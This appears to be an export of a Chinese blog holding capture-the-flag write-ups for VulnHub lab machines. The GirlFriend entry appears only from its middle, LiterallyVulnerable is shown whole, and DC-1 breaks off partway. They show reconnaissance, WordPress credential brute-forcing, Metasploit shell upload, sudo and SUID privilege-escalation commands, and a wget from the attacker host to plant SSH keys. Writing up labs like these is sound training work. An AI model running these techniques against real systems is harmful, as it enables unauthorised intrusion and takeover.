<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>

<br>

<p><img src="image-20200210204802372.png" alt="image-20200210204802372"> </p>
<br>

<p>排除本机与网关后，找出目标机，扫服务/端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<br>

<p>访问 <code>80</code> 端口的 Web页面。显示只有 <code>local</code> 地址才能访问，看源代码，作者给出提示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Maybe you can search how to use x-forwarded-for --&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>x-forwarded-for</code> ：用来识别通过 HTTP代理或负载均衡方式连接到 Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段（就是服务器用来识别客户端原始 IP 地址的）</p>
<br>

<p>改请求头，添加字段：<code>x-forwarded-for：localhost</code> ，返回页面信息（建议使用 Burp）</p>
<br>

<p><img src="2020-02-10-18-50-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="postman"> </p>
<p><img src="2020-02-10-20-58-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<hr>
<p><strong>NOTE</strong> ： 这里犯了一个错误，在查 <code>x-forwarded-for</code> 的时候，偶然看到了 <code>Postman</code> 也就是上图中的软件，下载、使用、测试浪费了许多时间，且最后越来越麻烦（提交表格、登录），最后便放弃了</p>
<br>

<p>不是说上图的软件不好用或难用，而是对其一点都不熟悉，不懂套路；<code>Burp</code> 使用不熟练 </p>
<p>在 Burp 上有更方便的操作方式，后来改之</p>
<br>

<hr>
<br>

<p>通过改 <code>x-forwarded-for</code> 值，达到了欺骗服务器并返回数据，页面源代码并无有价值信息</p>
<br>

<p>既然是 Web 那便开始扫目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.111 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirb http://192.168.56.111</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.111</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-10-18-46-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-10-18-48-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>


<p>得到地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/config/</span><br><span class="line">http://192.168.56.111/index.php/login/</span><br><span class="line">http://192.168.56.111/misc/</span><br><span class="line">http://192.168.56.111/robots.txt        <span class="comment">## /heyhoo.txt  </span></span><br><span class="line">http://192.168.56.111/server-status     <span class="comment">## 404</span></span><br><span class="line">http://192.168.56.111/heyhoo.txt        <span class="comment">### null</span></span><br></pre></td></tr></table></figure>

<p>经访问，下面两个地址返回 <code>200 OK</code> 但却空白，一般是后续填充内容使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/config/config.php   	<span class="comment"># 200 OK 返回空白</span></span><br><span class="line">http://192.168.56.111/misc/process.php      <span class="comment"># 200 OK 返回空白</span></span><br></pre></td></tr></table></figure>

<p><code>robot.txt</code> 只有一个限制地址，访问并无又有用价值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/heyhoo.txt</span><br><span class="line"></span><br><span class="line">http://192.168.56.111/heyhoo.txt	<span class="comment"># 无有用信息</span></span><br></pre></td></tr></table></figure>

<br>

<p>最后的几个地址，需要通过修改 <code>x-forwarded-for</code> 值才能访问：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/index.php/login/?page=index	<span class="comment"># Index</span></span><br><span class="line"> </span><br><span class="line">?page=login     <span class="comment">### 登录页面</span></span><br><span class="line">?page=about     <span class="comment">#### 无有价值信息</span></span><br><span class="line">?page=register  <span class="comment">## 注册页面</span></span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-10-21-37-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>注册后跳转登录，有三个选项， <code>Dahboard</code> 与 <code>Logout</code> 无甚作用，<code>Profile</code> 会显示你的账号信息</p>
<p>看源代码，除密码为明文，无其他有价值信息。</p>
<br>

<p>其实，跳转到 <code>Profile</code> 页的时候，就已经注意到 URL 了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/misc/process.php?page=profile&amp;user_id=14</span><br></pre></td></tr></table></figure>

<br>

<p><code>sqlmap</code> 并没有跑出什么，到时在改变数字的时候，底下会出现其他用户的信息</p>
<br>

<p>从一开始，挨个访问，到 <code>5</code> 的时候，出现了用户名为：<code>alice</code> 的用户，也就是 <code>GirlFriend</code> </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Name:</span> <span class="string">Alice</span> <span class="string">Geulis</span></span><br><span class="line"><span class="attr">username:</span> <span class="string">alice</span></span><br><span class="line"><span class="attr">passwd:</span> <span class="string">4lic3</span></span><br></pre></td></tr></table></figure>

<br>
<br>


<p><img src="2020-02-10-21-43-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-10-19-33-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p>登录 SSH 成功，访问目录得到隐藏文件和 FLAG1。然后就可以提权了</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Flag 1 :</span> <span class="string">gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</span></span><br></pre></td></tr></table></figure>

<br>



<p><img src="2020-02-10-19-48-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><br>

<p>执行 <code>sudo -l</code> ，发现了可以使用 <code>php</code> ，执行以下命令，直接提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CMD=<span class="string">"/bin/sh"</span></span><br><span class="line">sudo php -r <span class="string">"system('<span class="variable">$CMD</span>');"</span></span><br></pre></td></tr></table></figure>

<p>得到 FLAG2</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">Thanks!</span> <span class="attr">Flag 2:</span> <span class="string">gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125;</span></span><br></pre></td></tr></table></figure>

<br>


<p><img src="2020-02-10-22-01-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-10-20-24-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-10-20-23-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>LiterallyVulnerable</title>
    <url>/2020/03/19/LiterallyVulnerable/</url>
    <content><![CDATA[<blockquote>
<p>2020-03-08 14:26 — 2020-03-09</p>
</blockquote>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Flags</span>: <span class="number">3</span> (local.txt, user.txt &amp; root.txt)</span><br><span class="line">Difficulty <span class="attribute">Level</span>: Initial Shell (Easy) - Privileges Escalation (Intermediate)</span><br><span class="line"><span class="attribute">Website</span>: <span class="attribute">https</span>:<span class="comment">//ebryx.com</span></span><br><span class="line"><span class="attribute">Hint</span>: Maybe, you hasted and left some open holes unchecked?</span><br><span class="line">Literally Vulnerable is supposed to give beginners a taste of real-world scenarios and OSCP machines at the same time! It was inspired highly by the <span class="variable">@DC</span> series.</span><br><span class="line"></span><br><span class="line">You're supposed to know the big three (EEEs) Enumeration, Exploitation &amp; Escalation of pentesting to pwn the machine. The machine is supposed to be beginner-friendly and the difficulty level is Easy-Intermediate depending on your knowledge. You need to have enough information about Linux file types &amp; permissions for privileges escalation.</span><br><span class="line"></span><br><span class="line">Technical <span class="attribute">Information</span>:</span><br><span class="line">Just download, extract and load the .vmx file in VMware Workstation (tested on VMware Workstation <span class="number">15</span>.x.x)</span><br><span class="line">The adapter is currently NAT, networking is configured for DHCP and IP will get assigned automatically</span><br><span class="line"><span class="attribute">Contact</span>:</span><br><span class="line">You can either contact me on twitter <span class="variable">@syed__umar</span> or linkedin (/in/syedumararfeen/) for hints!</span><br><span class="line">There are three flags in the <span class="attribute">machine</span>: local.txt, user.txt &amp; root.txt. You're supposed to grab all three in order to completely pwn the machine. Hope you like the machine, best of luck! :)</span><br><span class="line"></span><br><span class="line">I'll try my best to continue with the series!</span><br><span class="line">--------</span><br><span class="line"><span class="attribute">From </span>: <span class="attribute">https</span>:<span class="comment">//www.vulnhub.com/entry/ua-literally-vulnerable,407/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali：172.16.252.129</span><br><span class="line">目标：172.16.252.1/24</span><br></pre></td></tr></table></figure>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -sn -T5 -v 172.16.252.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>

<p>目标端口服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -Pn -sV -O 172.16.252.131</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br></pre></td></tr></table></figure>

<p>全部端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">21/tcp open ftp vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r-- 1 ftp ftp 325 Dec 04 13:05 backupPasswords </span><br><span class="line">| ftp-syst:</span><br><span class="line">| 	STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">| Connected to ::ffff:172.16.252.129</span><br><span class="line">| Logged <span class="keyword">in</span> as ftp</span><br><span class="line">| TYPE: ASCII</span><br><span class="line">| No session bandwidth <span class="built_in">limit</span></span><br><span class="line">| Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">| Control connection is plain text</span><br><span class="line">| Data connections will be plain text</span><br><span class="line">| At session startup, client count was 1</span><br><span class="line">| vsFTPd 3.0.3 - secure, fast, stable </span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)</span><br><span class="line">| 256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA) </span><br><span class="line">|_ 256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Not so Vulnerable &amp;<span class="comment">#8211; Just another WordPress site </span></span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br></pre></td></tr></table></figure>

<p>开启的端口：21、22、80、65535</p>
<h3 id="FTP-匿名登陆"><a href="#FTP-匿名登陆" class="headerlink" title="FTP 匿名登陆"></a>FTP 匿名登陆</h3><p>FTP 可以匿名访问，得到几个密码，暂不知用途：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*<span class="variable">$eGRIf7v38s</span>&amp;p7 </span><br><span class="line">yP$*SV09YOrx7mY </span><br><span class="line">GmceC&amp;oOBtbnFCH </span><br><span class="line">3!IZguT2piU8X<span class="variable">$c</span> </span><br><span class="line">P&amp;s%F1D4<span class="comment">#KDBSeS</span></span><br><span class="line"><span class="variable">$EPid</span>%J2L9LufO5 </span><br><span class="line">nD!mb*aHON&amp;76&amp;G </span><br><span class="line">$*Ke7q2ko3tqoZo </span><br><span class="line">SCb<span class="variable">$I</span>^gDDqE34fA </span><br><span class="line">Ae%tM0XIWUMsCLp</span><br></pre></td></tr></table></figure>

<p><img src="2020-03-08-14-48-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-48-33屏幕截图"></p>
<p> <img src="2020-03-08-14-49-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-49-20屏幕截图">  </p>
<h3 id="Web-目录枚举"><a href="#Web-目录枚举" class="headerlink" title="Web 目录枚举"></a>Web 目录枚举</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: <span class="keyword">Not</span> so Vulnerable &amp;#8211; Just another WordPress site </span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu<span class="built_in"> Default </span>Page: It works</span><br></pre></td></tr></table></figure>

<p>80 端口： nginx + Wordpress</p>
<p>65535端口：Apache</p>
<p>控制台显示资源请求错误多，可以看到它是从 <code>literally.vulnerable</code> 请求资源，可以设置 DNS：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"172.16.252.131    literally.vulnerable"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p><img src="2020-03-08-14-54-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-54-43屏幕截图"></p>
<p>先扫描 65535 端口，逐一访问，得到 <code>phpcms</code> 页面，访问需要密码，<code>wpsacn</code> 枚举</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u <span class="string">"http://172.16.252.131:65535"</span> -e php --random-agents -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>

<p><img src="2020-03-08-15-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-15-13-12屏幕截图"> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ --enumerate</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] maybeadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] notadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>

<p>得到两个用户名，使用前面得到的几个密码枚举爆破，碰运气，得到一组用户名密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ -U users.txt -P backupPasswords</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[i] Valid Combinations Found:</span><br><span class="line">| Username: maybeadmin, Password:<span class="variable">$EPid</span>%J2L9LufO5</span><br></pre></td></tr></table></figure>

<p><img src="2020-03-08-16-25-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-25-38屏幕截图"></p>
<h3 id="登录-Wordpress-后台"><a href="#登录-Wordpress-后台" class="headerlink" title="登录 Wordpress 后台"></a>登录 Wordpress 后台</h3><p>都翻了一遍，得到一组用户名和密码：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">notadmin:Pa<span class="symbol">$</span><span class="symbol">$</span>w0rd13!&amp;</span><br></pre></td></tr></table></figure>

<p><img src="2020-03-08-16-41-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-41-43屏幕截图"> </p>
<h2 id="登录系统-Getshell"><a href="#登录系统-Getshell" class="headerlink" title="登录系统(Getshell)"></a>登录系统(Getshell)</h2><p>利用 <code>MSF</code> 上传木马 getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/unix/webapp/wp_admin_shell_upload</span><br></pre></td></tr></table></figure>

<p><img src="2020-03-09-18-18-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-18-18-23屏幕截图"></p>
<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer : literallyvulnerable</span><br><span class="line">OS : Linux literallyvulnerable 4.15.0-88-generic <span class="comment">#88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64</span></span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">######## lsb_release #############</span></span><br><span class="line">www-data@literallyvulnerable:$ lsb_release -a lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description: Ubuntu 18.04.3 LTS</span><br><span class="line">Release: 18.04</span><br><span class="line">Codename: bionic</span><br><span class="line"></span><br><span class="line"><span class="comment">####### /etc/passwd #######</span></span><br><span class="line">doe:x:1001:1001:Doe,,,:/home/doe:/bin/bash </span><br><span class="line">john:x:1000:1000:,,,:/home/john:/bin/bash</span><br></pre></td></tr></table></figure>

<p>寻找 SUID 程序，得到可疑文件：<code>itseasy</code> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="2020-03-09-19-27-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-27-43屏幕截图"> </p>
<h2 id="权限提升-User"><a href="#权限提升-User" class="headerlink" title="权限提升(User)"></a>权限提升(User)</h2><p>运行 <code>itseasy</code> 得到当前目录绝对路径，看过一篇通过操控 <code>PATH</code> 参数值进行提权；怀疑程序调用了 <code>pwd</code> 命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">cp /bin/bash /tmp/<span class="built_in">pwd</span>    <span class="comment"># or echo "/bin/bash" &gt; /tmp/pwd</span></span><br><span class="line">chmod 777 /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p>执行后，没有得到预期的结果</p>
<p><code>objdump -d</code> 一下，看到个 <code>getenv</code> 函数，用来获取环境变量</p>
<p>也就是可以通过改变环境变量的值来控制这个程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PWD=\$\(/bin/bash\)</span><br></pre></td></tr></table></figure>

<p><img src="2020-03-09-20-28-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-28-54屏幕截图"> </p>
<p><img src="2020-03-09-19-42-16%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-42-16屏幕截图"></p>
<p>然后输入命令没有回显了，直接 SSH ：kali 下生成 ssh 公钥上传到目标机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/john/.ssh &amp;&amp; wget http://172.16.252.129:8848/autorized_keys</span><br></pre></td></tr></table></figure>

<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>HOME 目录下的到一个 base64加密的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">am9objpZWlckczhZNDlJQiNaWko= </span><br><span class="line"><span class="built_in">echo</span><span class="string">"am9objpZWlckczhZNDlJQiNaWko="</span>| base64 -d </span><br><span class="line"></span><br><span class="line">john:YZW<span class="variable">$s8Y49IB</span><span class="comment">#ZZJ</span></span><br></pre></td></tr></table></figure>

<p><img src="2020-03-09-19-54-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-54-52屏幕截图"> </p>
<p><img src="2020-03-09-20-02-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-02-37屏幕截图"> </p>
<p><img src="2020-03-09-20-05-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-05-51屏幕截图"></p>
<p>搜索 SUID 程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find/ -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudopasswd root</span><br><span class="line">Sorry, user john is not allowed to execute <span class="string">'/usr/bin/passwd root'</span> as root on literallyvulnerable.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries forjohn on literallyvulnerable:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/</span><br><span class="line">sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">    User john may run the following commands on literallyvulnerable: </span><br><span class="line">        (root) /var/www/html/test.html</span><br></pre></td></tr></table></figure>

<p>可以运行 <code>/var/www/html/test.html</code> </p>
<h2 id="权限提升-root"><a href="#权限提升-root" class="headerlink" title="权限提升(root)"></a>权限提升(root)</h2><p><code>/var/www/html</code> 目录下没有 <code>test.html</code> 文件，且 <code>john</code> 没有 <code>html</code> 目录的写权限，那就切换回 <code>www-data</code> 用户创建文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; test.html</span><br><span class="line">chmod 777 test.html</span><br></pre></td></tr></table></figure>

<p><code>sudo</code> 运行，提权成功</p>
<p><img src="2020-03-09-20-19-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-19-09屏幕截图"></p>
<p><img src="2020-03-09-20-21-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-25屏幕截图"> </p>
<p><img src="2020-03-09-20-21-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-43屏幕截图"> </p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-1</title>
    <url>/2020/03/19/DC-1/</url>
    <content><![CDATA[<blockquote>
<p>2020-03-17</p>
</blockquote>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian))</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">################## ALL Port ###########################3</span></span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">| 2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA) </span><br><span class="line">|_ 256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian)) |_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">|/themes//CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">|/INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">| program version port/proto service</span><br><span class="line">...</span><br><span class="line">35460/tcp open status 1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>

<h3 id="web-目录枚举"><a href="#web-目录枚举" class="headerlink" title="web 目录枚举"></a>web 目录枚举</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta">############# /robots.txt ################ #</span></span><br><span class="line"><span class="meta"># robots.txt</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># This file is to prevent the crawling and indexing of certain parts</span></span><br><span class="line"><span class="meta"># of your site by web crawlers and spiders run by sites like Yahoo!</span></span><br><span class="line"><span class="meta"># and Google. By telling these <span class="string">"robots"</span> where not to go on your site,</span></span><br><span class="line"><span class="meta"># you save bandwidth and server resources.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># This file will be ignored unless it is at the root of your host:</span></span><br><span class="line"><span class="meta"># Used:</span></span><br><span class="line"><span class="meta"># Ignored: #</span></span><br><span class="line"><span class="meta"># For more</span></span><br><span class="line"><span class="meta"># http:<span class="comment">//www.robotstxt.org/wc/robots.html #</span></span></span><br><span class="line"><span class="meta"># For syntax checking, see:</span></span><br><span class="line"><span class="meta"># http:<span class="comment">//www.sxw.org.uk/computing/robots/check.html</span></span></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: <span class="number">10</span></span><br><span class="line"><span class="meta"># Directories</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/includes/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/misc/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/modules/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/profiles/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/scripts/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/themes/</span></span><br><span class="line"><span class="meta"># Files</span></span><br><span class="line"><span class="symbol">Disallow:</span> /CHANGELOG.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /cron.php</span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.mysql.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.pgsql.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.sqlite.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /install.php </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /LICENSE.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /MAINTAINERS.txt</span><br><span class="line"><span class="symbol">Disallow:</span> /update.php </span><br><span class="line"><span class="symbol">Disallow:</span> /UPGRADE.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /xmlrpc.php</span><br><span class="line"><span class="meta"># Paths (clean URLs) </span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/admin/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/comment/</span>reply/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span 